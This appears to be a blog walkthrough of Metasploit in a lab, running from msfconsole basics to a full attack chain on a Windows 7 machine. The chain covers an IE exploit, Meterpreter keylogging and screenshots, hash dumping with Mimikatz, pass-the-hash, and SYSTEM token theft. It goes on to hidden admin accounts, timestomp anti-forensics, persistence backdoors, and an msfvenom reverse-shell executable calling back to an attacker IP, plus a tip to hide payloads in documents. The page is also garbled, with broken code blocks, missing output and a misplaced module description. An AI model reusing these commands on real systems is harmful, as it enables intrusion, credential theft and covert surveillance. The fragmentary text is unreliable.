<h1>Msfconsole</h1>

<p>The <code>msfconsole</code> (Metasploit Framework Console) is where you will be spending most of your time when working with Metasploit. You can do almost everything from here, but the amount of commands might seem overwhelming at first.</p>

<p><img class="center" src="/images/tools/metasploit/msfbanner.png" title="&lsquo;msfconsole&rsquo; &lsquo;metasploit framework&rsquo;" ></p>

<p>Besides the Metasploit functionality, you <strong>can run external commands in the console</strong>, which is really helpful.</p>

<p>``` plain
msf > uname -a
[*] exec: uname -a</p>

<p>Linux pwnbox 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux
```</p>

<p>The first thing you probably want to do is look at the help menu:</p>

<p>``` plain
msf > help</p>

</code></pre>

<p>&hellip;
```</p>

<p>Every time you enter a new context, you can use <strong>help</strong> to see the options available for that context. For instance, after selecting an exploit:</p>

<p>``` plain
msf > use exploit/linux/http/advantech_switch_bash_env_exec
msf exploit(advantech_switch_bash_env_exec) > help
&hellip;</p>

<h1>Exploit Commands</h1>

<pre><code>Command       Description

</code></pre>

<p>```</p>

<p>Or after setting a payload:</p>

<p>``` plain</p>

<h1>Payload Commands</h1>

<pre><code>Command       Description

</code></pre>

<p>```</p>

<p>Many commands also have their own help menu that you can access by typing <code>help cmd</code> or by passing the -h switch: <code>cmd -h</code>. Let&rsquo;s now glance over some core commands</p>

<p>Description:
  This module exploits a parsing flaw in the path canonicalization
  code of NetAPI32.dll through the Server Service. This module is
  capable of bypassing NX on some operating systems and service packs.
  The correct target must be used to prevent the Server Service (along
  with a dozen others in the same process) from crashing. Windows XP
  targets seem to handle multiple successful exploitation events, but
  2003 targets will often crash or hang on subsequent attempts. This
  is just the first version of this module, full support for NX bypass
  on 2003, along with other platforms, is still in development.</p>

<ul>
<li><strong>spool</strong> &ndash; write console log to a file</li>
</ul>


<p>``` plain

Usage: spool <off>|<filename></p>

<p>Example:
  spool /tmp/console.log
```</p>

<ul>
<li><strong>use</strong> &ndash; selects module</li>
</ul>


<h1>Payload types</h1>

<p>There are 3 types of payloads that you can use with your exploits.</p>

<ul>
<li><p><strong>singles</strong> are standalone payloads that have everything needed to run by themselves. They are reliable but their size might be a detriment with some exploits</p></li>
<li><p><strong>stagers</strong> are small and are designed to establish a connection between attacker and victim and download additional components for the exploit as needed</p></li>
<li><p><strong>stages</strong> have various functionalities and are downloaded by the stagers to be run on the remote host</p></li>
</ul>


<h2>Payload generation</h2>

<p>The following are the available options for generating payloads:</p>

<p>``` plain
sf payload(generic) > generate -h
Usage: generate [options]</p>

<p>Generates a payload.</p>

<p>OPTIONS:</p>

<pre><code>-E        Force encoding.
-b &lt;opt&gt;  The list of characters to avoid: '\x00\xff'
-e &lt;opt&gt;  The name of the encoder module to use.
-f &lt;opt&gt;  The output file name (otherwise stdout)
-h        Help banner.
-i &lt;opt&gt;  the number of encoding iterations.
-k        Keep the template executable functional
-o &lt;opt&gt;  A comma separated list of options in VAR=VAL format.
-p &lt;opt&gt;  The Platform for output.
-s &lt;opt&gt;  NOP sled length.
-t &lt;opt&gt;  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-net,psh-reflection,psh-cmd,vba,vba-exe,vba-psh,vbs,war
-x &lt;opt&gt;  The executable template to use
</code></pre>

<p>```</p>

<h1>Working with the database</h1>

<p>Metasploit is backed by a powerful database that you can use to organize and classify the information. First, you have to start the PostgreSQL server: <code>service postgresql start</code>. Then you create and initialize the database after starting Metasploit with the <code>msfdb init</code> command.</p>

<p>Let&rsquo;s look at the database commands:</p>

<p>``` plain</p>

<h1>Database Backend Commands</h1>

<pre><code>Command           Description
-------           -----------
creds             List all credentials in the database
db_connect        Connect to an existing database
db_disconnect     Disconnect from the current database instance
db_export         Export a file containing the contents of the database
db_import         Import a scan result file (filetype will be auto-detected)
db_nmap           Executes nmap and records the output automatically
db_rebuild_cache  Rebuilds the database-stored module cache
db_status         Show the current database status
hosts             List all hosts in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces
</code></pre>

<p>```</p>

<p>Chances are, you will want to keep your targets organized and separate from each other. For this, you can build different workspaces for every one:</p>

<p>``` plain
msf > help workspace
Usage:</p>

<pre><code>workspace                  List workspaces
workspace [name]           Switch workspace
workspace -a [name] ...    Add workspace(s)
workspace -d [name] ...    Delete workspace(s)
workspace -D               Delete all workspaces
workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
workspace -h               Show this help information
</code></pre>

<p>```</p>

<p>Let&rsquo;s say that you want a separate workspace for your lab target. You can add it and all the subsequent information will be saved in this workspace:</p>

<p><code>plain
msf &gt; workspace -a lab
[*] Added workspace: lab
msf &gt; workspace
  default
* lab
</code></p>

<p>Now let&rsquo;s populate this workspace with some information about the target. I ran a <code>db_nmap</code> scan on the box and then I looked at the hosts data:</p>

<p>``` plain
msf > hosts</p>

<h1>Hosts</h1>

<p>address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments</p>

```</p>

<p>There is more that you can do with the <strong>hosts</strong> command:</p>

<p>``` plain
msf > hosts -h
Usage: hosts [ options ] [addr1 addr2 &hellip;]</p>

<p>OPTIONS:
  -a,&mdash;add          Add the hosts instead of searching
  -d,&mdash;delete       Delete the hosts instead of searching
  -c &lt;col1,col2>    Only show the given columns (see list below)
  -h,&mdash;help         Show this help information
  -u,&mdash;up           Only show hosts which are up
  -o <file>         Send output to a file in csv format
  -R,&mdash;rhosts       Set RHOSTS from the results of the search
  -S,&mdash;search       Search string to filter by
  -i,&mdash;info         Change the info of a host
  -n,&mdash;name         Change the name of a host
  -m,&mdash;comment      Change the comment of a host
  -t,&mdash;tag          Add or specify a tag to a range of hosts</p>

<p>Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```</p>

<p>With the <strong>services</strong> command, you can look at the identified services:</p>

<p>``` plain
msf > services -h</p>

<p>Usage: services [-h] [-u] [-a] [-r <proto>] [-p &lt;port1,port2>] [-s &lt;name1,name2>] [-o <filename>] [addr1 addr2 &hellip;]</p>

<p>  -a,&mdash;add          Add the services instead of searching
  -d,&mdash;delete       Delete the services instead of searching
  -c &lt;col1,col2>    Only show the given columns
  -h,&mdash;help         Show this help information
  -s &lt;name1,name2>  Search for a list of service names
  -p &lt;port1,port2>  Search for a list of ports
  -r <protocol>     Only show [tcp|udp] services
  -u,&mdash;up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -R,&mdash;rhosts       Set RHOSTS from the results of the search
  -S,&mdash;search       Search string to filter by</p>

<p>Available columns: created_at, info, name, port, proto, state, updated_at</p>

<p>msf > services</p>

<p>You can also look at the vulnerabilities associated with different services:</p>

<p>``` plain
msf > help vulns
Print all vulnerabilities in the database</p>

<p>Usage: vulns [addr range]</p>

<p>  -h,&mdash;help             Show this help information
  -p,&mdash;port <portspec>  List vulns matching this port spec
  -s <svc names>        List vulns matching these service names
  -R,&mdash;rhosts           Set RHOSTS from the results of the search
  -S,&mdash;search           Search string to filter by
  -i,&mdash;info             Display Vuln Info</p>

<p>Examples:

  vulns -p 1-65536 -s http  # identified as http on any port
```</p>

<p>It&rsquo;s possible to also add notes:</p>

<p>``` plain

<p>If credentials were found, we have a way to list and manage them:</p>

<p>``` plain
msf > help creds</p>

<p>With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.</p>

<p>Usage &ndash; Listing credentials:
  creds [filter options] [address range]</p>

<p>Usage &ndash; Adding credentials:
  creds add-ntlm <user> <ntlm hash> [domain]
  creds add-password <user> <password> [realm] [realm-type]
  creds add-ssh-key <user> &lt;/path/to/id_rsa> [realm-type]
Where [realm type] can be one of:
  domain &ndash; Active Directory Domain
  db2db &ndash; DB2 Database
  sid &ndash; Oracle System Identifier
  pgdb &ndash; PostgreSQL Database
  wildcard &ndash; *</p>

<p>General options
  -h,&mdash;help             Show this help information
  -o <file>             Send output to a file in csv format
  -d                    Delete one or more credentials</p>

<p>Filter options for listing
  -P,&mdash;password <regex> List passwords that match this regex
  -p,&mdash;port <portspec>  List creds with logins on services matching this port spec
  -s <svc names>        List creds matching comma-separated service names
  -u,&mdash;user <regex>     List users that match this regex
  -t,&mdash;type <type>      List creds that match the following types: password,ntlm,hash
  -O,&mdash;origins          List creds that match these origins
  -R,&mdash;rhosts           Set RHOSTS from the results of the search</p>

<p>Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # nmap host specification
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
  creds -t ntlm       # All NTLM creds</p>

<p>Examples, adding:
  # Add a user with an NTLMHash
  creds add-ntlm alice 5cfe4c82d9ab8c66590f5b47cd6690f1:978a2e2e1dec9804c6b936f254727f9a
  # Add a user with a blank password and a domain
  creds add-password bob &lsquo;&rsquo; contosso
  # Add a user with an SSH key
  creds add-ssh-key root /root/.ssh/id_rsa</p>

<p>Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```</p>

<p>As you can see though, I have no credentials in the database:</p>

<p>``` plain
msf > creds</p>

<p>Finally, there is the loot:</p>

<p>``` plain

  Add: loot -f [fname] -i [info] -a [addr1 addr2 &hellip;] [-t [type]
  Del: loot -d [addr1 addr2 &hellip;]</p>

<p>  -a,&mdash;add          Add loot to the list of addresses, instead of listing

<h1>Meterpreter</h1>

<p>Next, let&rsquo;s look at Meterpreter, the king of payloads. Meterpreter has no disk presence because it only exists in memory, and it leaves no trail behind of created processes because it injects itself in currently running processes. To top it off, its traffic is encrypted. I will show Meterpreter in action here, but this time, the target is a Windows 7 machine.</p>

<p>I&rsquo;ve already set up the exploit:</p>

```</p>

<p>And the description of what this exploit does:</p>

<p><code>plain
Description:
  This module exploits a memory corruption vulnerability within
  Microsoft\'s HTML engine (mshtml). When parsing an HTML page
  containing a recursive CSS import, a C++ object is deleted and later
  reused. This leads to arbitrary code execution. This exploit
  utilizes a combination of heap spraying and the .NET 2.0
  'mscorie.dll' module to bypass DEP and ASLR. This module does not
  opt-in to ASLR. As such, this module should be reliable on all
  Windows versions with .NET 2.0.50727 installed.
</code></p>

<p>All right, first I start the handler on my attacking machine:</p>

<p>``` plain
msf exploit(ms11_003_ie_css_import) > run -j
[*] Exploit running as background job.</p>

<p>[<em>] Started reverse TCP handler on 192.168.80.155:4444

<p>Then on the victim, I disabled WIndows Firewall and then I used Internet Explorer (ugh) to go to the URL <code><a href="http://192.168.80.155:8080/Br8CNFRY">http://192.168.80.155:8080/Br8CNFRY</a></code>. And on my Kali machine, a Meterpreter session was opened:</p>

<p>I actually closed IE on the Windows machine because it kept requesting the DLL and opening more sessions. Now it&rsquo;s time to go to the newly created Meterpreter session:</p>

<p>So let&rsquo;s now play with the available functionality. I made a file that I will upload to the hacked machine:</p>

```</p>

<p>If you&rsquo;re feeling brave, you can mess around, uhm, interact with the target registry:</p>

<p>``` plain
meterpreter > reg -h
Usage: reg [command] [options]</p>

<p>Interact with the target machine&rsquo;s registry.</p>

<p>OPTIONS:</p>

<pre><code>-d &lt;opt&gt;  The data to store in the registry value.
-h        Help menu.
-k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).

<p>```</p>

<p>To leverage more Windows-specific functionality, you can choose to spawn a system shell and do your work from there:</p>

<p>``` plain
meterpreter > shell

<h3>User interface commands</h3>

<p>We can interact with various components of the Windows GUI. First, let&rsquo;s enumerate the available desktops and get the current one:</p>

<p>``` plain
meterpreter > enumdesktops
Enumerating all accessible desktops</p>

<h1>Desktops</h1>

<pre><code>Session  Station  Name
-------  -------  ----
1        WinSta0  Default
1        WinSta0  Disconnect
1        WinSta0  Winlogon
</code></pre>

<p>meterpreter > getdesktop
Session 1\W\D
```</p>

<p>See how long the user has been idle:</p>

<p><code>plain
meterpreter &gt; idletime
User has been idle for: 5 mins 10 secs
</code></p>

<p>If you want to know what the user is up to, you can start a keylogger and quietly observe everything like a ghost in the machine:</p>

<p><code>plain
meterpreter &gt; keyscan_start
Starting the keystroke sniffer...
</code></p>

<p>I typed something on the hacked machine and now I&rsquo;m going to dump the keystrokes and see what we&rsquo;ve got:</p>

<p><code>plain
meterpreter &gt; keyscan_dump
Dumping captured keystrokes...
much $ such security wow
meterpreter &gt; keyscan_stop
Stopping the keystroke sniffer...
</code></p>

<p>Now I want to see what the user sees. So let&rsquo;s take a screenshot:</p>

<p><code>plain
meterpreter &gt; screenshot
Screenshot saved to: /root/ahhOgnkh.jpeg
</code></p>

<p><img class="center" src="/images/tools/metasploit/ss.jpeg" title="&lsquo;screenshot&rsquo; &lsquo;screenshot of target desktop&rsquo;" ></p>

<p>In case you want to annoy the user, you can mess with some of the user interface:</p>

<p><code>plain
meterpreter &gt; uictl -h
Usage: uictl [enable/disable] [keyboard/mouse/all]
</code></p>

<p>I can&rsquo;t demo the webcam and mic commands now so I won&rsquo;t go into those, but you have them at your disposal if the target has a webcam or microphone</p>

<h2>Post exploitation</h2>

<p>Once you have a foothold on the system, there are more things that you can do to assist you in squeezing more juice out of the hacked machine</p>

<h3>Dumping hashes</h3>

<p>You can use <em>hashdump</em> to dump the local hashes:</p>

<p><code>plain
meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

</code></p>

<p>It is possible to also get the hashes and credentials straight from memory by using Mimikatz:</p>

<p>``` plain
meterpreter > load mimikatz
Loading extension mimikatz&hellip;success.
meterpreter > help mimikatz</p>

<h1>Mimikatz Commands</h1>

<pre><code>Command           Description

0;999    NTLM       WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)
```</p>

<h3>Pass the hash</h3>

<p>We can now use the <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">psexec</a> module to pass the hash and get access on the box, without any cracking. Note that on my Windows lab machine, I had to go to Local Security Policy &ndash;> Local Policies &ndash;> Security Options &ndash;> Accounts: Limit local account use of blank passwords to console logon only and set it to disabled.</p>

<p>``` plain

```</p>

<h3>Token impersonation</h3>

<p>We owned an administrator account. But we want even more privileges. We can use the <em>incognito</em> module to steal the SYSTEM token for ourselves:</p>

<p>``` plain
meterpreter > use incognito
Loading extension incognito&hellip;success.
meterpreter > help
&hellip;</p>

<h1>Incognito Commands</h1>

<pre><code>Command              Description
-------              -----------
add_group_user       Attempt to add a user to a global group with all tokens
add_localgroup_user  Attempt to add a user to a local group with all tokens
add_user             Attempt to add a user with all tokens
impersonate_token    Impersonate specified token
list_tokens          List tokens available under current user context
snarf_hashes         Snarf challenge/response hashes for every token
</code></pre>

<p>```</p>

<p>Let&rsquo;s see what tokens are available:</p>

<p>``` plain
meterpreter > list_tokens
Usage: list_tokens &lt;list_order_option></p>

<p>Lists all accessible tokens and their privilege level</p>

<p>OPTIONS:</p>

<pre><code>-g        List tokens by unique groupname
-u        List tokens by unique username
</code></pre>

<p>meterpreter > list_tokens -u
[&ndash;] Warning: Not currently running as SYSTEM, not all tokens will be available</p>

<pre><code>         Call rev2self if primary process token is SYSTEM
</code></pre>

<h1>Delegation Tokens Available</h1>

<p>NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-D7GA2J1M0TU\wingoat</p>

<h1>Impersonation Tokens Available</h1>

<p>NT AUTHORITY\ANONYMOUS LOGON
```</p>

<p>We are interested in the delegation tokens that are created by interactive logins. And among them..the SYSTEM token that we want!</p>

<p>``` plain
meterpreter > impersonate_token
Usage: impersonate_token <token></p>

<p>Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.</p>

<p>Hint: Double backslash DOMAIN\name (meterpreter quirk)
Hint: Enclose with quotation marks if name contains a space</p>

<p>meterpreter > impersonate_token &lsquo;NT AUTHORITY\SYSTEM&rsquo;
[&ndash;] Warning: Not currently running as SYSTEM, not all tokens will be available</p>

<pre><code>         Call rev2self if primary process token is SYSTEM
</code></pre>

<p>[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```</p>

<h3>Remote Desktop</h3>

<p>Another way we can get access to the system is via Remote Desktop:</p>

<p>``` plain
meterpreter > run getgui
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u <username> -p <password>
Or:    getgui -e</p>

<p>OPTIONS:</p>

<pre><code>-e        Enable RDP only.
-f &lt;opt&gt;  Forward RDP Connection.
-h        Help menu.
-p &lt;opt&gt;  The Password of the user to add.
-u &lt;opt&gt;  The Username of the user to add.
</code></pre>

<p>```</p>

<p>Let&rsquo;s use it to enable Remote Desktop on the target and add our own user:</p>

<p><code>plain
meterpreter &gt; run getgui -e
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*]     RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] The following Error was encountered: Rex::TimeoutError Operation timed out.
[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2112.rc
meterpreter &gt; run getgui -u master -p pwned
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Setting user account for logon
[*]     Adding User: master with Password: pwned
[*]     Hiding user from Windows Login screen
[*]     Adding User: master to local group 'Remote Desktop Users'
[*]     Adding User: master to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
</code></p>

<p>And to check if it worked, we can use the <em>rdesktop</em> client like this:</p>

<p><code>plain
root@pwnbox:~#rdesktop -u master -p pwned 192.168.80.128
</code></p>

<p><img class="center" src="/images/tools/metasploit/rd.png" title="&lsquo;remote desktop&rsquo; &lsquo;remote desktop session on hacked machine&rsquo;" ></p>

<p>However, this is not very stealthy, because if another user is logged in, they will be disconnected. Anyway, better clean up after ourselves when we&rsquo;re done:</p>

<p><code>plain
meterpreter &gt; run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
[*] Running Command List ...
[*]     Running command execute -H -f cmd.exe -a "/c net user master /delete"
Process 832 created.
[*]     Running command reg deleteval -k HKLM\\SOFTWARE\\Microsoft\\Windows\ NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -v master
[-] stdapi_registry_open_key: Operation failed: The system cannot find the file specified.
</code></p>

<p>Despite the error above, the user was removed from the logon session. However, some files of that user remained behind and I had to manually delete them</p>

<h3>Packet sniffing</h3>

<p>Further on, we can enable a packet sniffer on the target to gather more sensitive information:</p>

<p>``` plain
meterpreter > use sniffer
Loading extension sniffer&hellip;success.
meterpreter > help
&hellip;</p>

<h1>Sniffer Commands</h1>

<pre><code>Command             Description
-------             -----------
sniffer_dump        Retrieve captured packet data to PCAP file
sniffer_interfaces  Enumerate all sniffable network interfaces
sniffer_release     Free captured packets on a specific interface instead of downloading them
sniffer_start       Start packet capture on a specific interface
sniffer_stats       View statistics of an active capture
sniffer_stop        Stop packet capture on a specific interface
</code></pre>

<p>```</p>

<p>First, we must learn what network interfaces are available:</p>

<p>``` plain
meterpreter > sniffer_interfaces</p>

<p>1 &ndash; &lsquo;WAN Miniport (Network Monitor)&rsquo; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 &ndash; &lsquo;Intel&reg; PRO/1000 MT Network Connection&rsquo; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
```</p>

<p>Now we can start sniffing:</p>

<p><code>plain
meterpreter &gt; sniffer_start 2
[*] Capture started on interface 2 (50000 packet buffer)
</code></p>

<p>We can then dump the packets to a file and see if we&rsquo;ve got anything interesting:</p>

<p><code>plain
meterpreter &gt; sniffer_dump 2 /root/capture.pcap
[*] Flushing packet capture buffer for interface 2...
[*] Flushed 873 packets (756096 bytes)
[*] Downloaded 069% (524288/756096)...
[*] Downloaded 100% (756096/756096)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to /root/capture.pcap
</code></p>

<h3>Modifying file attributes</h3>

<p>If you left traces on the filesystem, you can modify or erase file attributes to conceal your footprints:</p>

<p>``` plain
meterpreter > timestomp -h</p>

<p>Usage: timestomp OPTIONS file_path</p>

<p>OPTIONS:</p>

<pre><code>-a &lt;opt&gt;  Set the "last accessed" time of the file
-b        Set the MACE timestamps so that EnCase shows blanks
-c &lt;opt&gt;  Set the "creation" time of the file
-e &lt;opt&gt;  Set the "mft entry modified" time of the file
-f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file
-h        Help banner
-m &lt;opt&gt;  Set the "last written" time of the file
-r        Set the MACE timestamps recursively on a directory
-v        Display the UTC MACE values of the file
-z &lt;opt&gt;  Set all four attributes (MACE) of the file
</code></pre>

<p>```</p>

<h3>Backdooring the system</h3>

<p>If you want to maintain your presence on the target system, Metasploit has two types of backdoors that can be installed as a service on the target. However, keep in mind that they don&rsquo;t have any authentication, so best not leave them around on computers outside a lab environment &ndash; you don&rsquo;t want to open the door for everyone else in the world.</p>

<h4>Metsvc</h4>

<p>This is how Metsvc looks like:</p>

<p>``` plain
meterpreter > run metsvc -h</p>

<p>OPTIONS:</p>

<pre><code>-A        Automatically start a matching exploit/multi/handler to connect to the service
-h        This help menu
-r        Uninstall an existing Meterpreter service (files must be deleted manually)
</code></pre>

<p>meterpreter > run metsvc
[<em>] Creating a meterpreter service on port 31337
[</em>] Creating a temporary installation directory C:\Users\wingoat\AppData\Local\Temp\zMWkKgMkxJRdgpp&hellip;
[<em>]  >> Uploading metsrv.x86.dll&hellip;
[</em>]  >> Uploading metsvc-server.exe&hellip;
[<em>]  >> Uploading metsvc.exe&hellip;
[</em>] Starting the service&hellip;</p>

<pre><code> * Installing service metsvc
</code></pre>

<ul>
<li>Starting service
Service metsvc successfully installed.
```</li>
</ul>


<p>Unfortunately, I couldn&rsquo;t connect to it because I got a bunch of SSL errors and I couldn&rsquo;t find any workaround.</p>

<h4>Persistence</h4>

<p>The Persistence script has more options:</p>

<p>``` plain
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.</p>

<p>OPTIONS:</p>

<pre><code>-A        Automatically start a matching exploit/multi/handler to connect to the agent
-L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.
-P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.
-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
-T &lt;opt&gt;  Alternate executable template to use
-U        Automatically start the agent when the User logs on
-X        Automatically start the agent when the system boots
-h        This help menu
-i &lt;opt&gt;  The interval in seconds between each connection attempt
-p &lt;opt&gt;  The port on which the system running Metasploit is listening
-r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back
</code></pre>

<p>```</p>

<p>First, we set our listener:</p>

<p>``` plain
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > options</p>

<p>Module options (exploit/multi/handler):</p>

<p>   Name  Current Setting  Required  Description</p>

<hr />

<p>Payload options (windows/meterpreter/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)

   LPORT     5555             yes       The listen port
&hellip;
```</p>

<p>Then on the target machine we install the backdoor and it connects back to us!</p>

<h1>Generating executables</h1>

<p>With Msfvenom, you can not only generate shellcode, but also create executables from whichever payload you want to use.</p>

<p>``` plain
root@pwnbox:~#msfvenom -h
Options:</p>

<pre><code>-p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
    --payload-options            List the payload's standard options
-l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
-n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
-f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
    --help-formats               List available formats
-e, --encoder       &lt;encoder&gt;    The encoder to use
-a, --arch          &lt;arch&gt;       The architecture to use
    --platform      &lt;platform&gt;   The platform of the payload
    --help-platforms             List available platforms
-s, --space         &lt;length&gt;     The maximum size of the resulting payload
    --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
-b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
-i, --iterations    &lt;count&gt;      The number of times to encode the payload
-c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
-x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
-k, --keep                       Preserve the template behavior and inject the payload as a new thread
-o, --out           &lt;path&gt;       Save the payload
-v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
    --smallest                   Generate the smallest possible payload
-h, --help                       Show this message
</code></pre>

<p>```</p>

<p>Let&rsquo;s say we want to use a reverse shell executable. First, let&rsquo;s look at the payload options:</p>

<p>``` plain
root@pwnbox:~#msfvenom &mdash;payload-options -p windows/x64/shell/reverse_tcp
Ignoring bcrypt-3.1.10 because its extensions are not built.  Try: gem pristine bcrypt &mdash;version 3.1.10
Options for payload/windows/x64/shell/reverse_tcp:</p>

<pre><code>   Name: Windows x64 Command Shell, Windows x64 Reverse TCP Stager

<p>Provided by:</p>

<pre><code>sf &lt;stephen_fewer@harmonysecurity.com&gt;

<p>Basic options:

<hr />

<p>EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
LHOST     192.168.80.155   yes       The listen address
LPORT     4444             yes       The listen port</p>

<p>Description:
  Spawn a piped command shell (Windows x64) (staged). Connect back to
  the attacker (Windows x64)
&hellip;
```</p>

<p>Now we know what options we need for creating an executable. I already have the LHOST and LPORT set, but will pass them anyway for demo purposes:</p>

<p><code>plain
root@pwnbox:~#msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.80.155 LPORT=4444 -b "\x00" -e x64/xor -f exe -o ~/doom.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86_64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor chosen with final size 551
Payload size: 551 bytes
Saved as: /root/doom.exe
</code></p>

<p>Inside Metasploit, we have to launch the generic payload handler. <a href="https://www.rapid7.com/db/modules/exploit/multi/handler">This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.</a>. Don&rsquo;t forget to set the options and the payload to match the one you put in the executable:</p>

<p>``` plain
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(handler) > options</p>

<p>Module options (exploit/multi/handler):</p>

<p>   Name  Current Setting  Required  Description</p>

<hr />

<p>Payload options (windows/x64/shell/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Wildcard Target
```</p>

<p>Now run the exploit on your machine. All you need to do now is to transfer your executable to the victim machine and run it there to receive your shell:</p>

<p>``` plain
msf exploit(handler) > run</p>

<p>[<em>] Started reverse TCP handler on 192.168.80.155:4444

```</p>

<p>Success! This demo was pretty straightforward, but if executables attract too much attention on the target, you can try to sneak your payload into PDFs or Word documents instead.</p>

<h5>Conclusion</h5>

<p>This was a long post, but I wanted to showcase many of Metasploit&rsquo;s capabilities. It was a fun lab, but I barely scratched the surface of what&rsquo;s possible.</p>
